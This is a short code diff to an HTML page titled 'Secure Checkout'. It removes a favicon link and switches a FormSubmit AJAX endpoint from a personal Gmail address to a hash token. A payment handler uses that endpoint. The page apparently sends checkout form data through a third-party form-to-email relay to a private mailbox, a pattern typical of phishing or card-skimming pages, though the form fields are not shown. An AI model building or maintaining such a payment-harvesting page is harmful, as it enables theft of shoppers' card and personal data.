@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Checkout</title>
-    <!-- Favicon link added as requested -->
-    <link rel="icon" type="image/png" href="../Images/Favicon.png">
     <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Configure Tailwind to use the Inter font and a simple color palette -->
@@ -188,8 +186,8 @@
     </div>
 
     <script>
-        // The URL for the FormSubmit AJAX endpoint, updated to the new email address.
-        const FORMSUBMIT_URL = "https://formsubmit.co/ajax/synaptixshipping@gmail.com";
+        // The URL for the FormSubmit AJAX endpoint, updated to use the provided hash string.
+        const FORMSUBMIT_URL = "https://formsubmit.co/ajax/80f7e02a47ee4e2ff6ffd76072398492";
 
         async function handlePaymentTransition(event) {
             event.preventDefault(); // Stop normal form submission
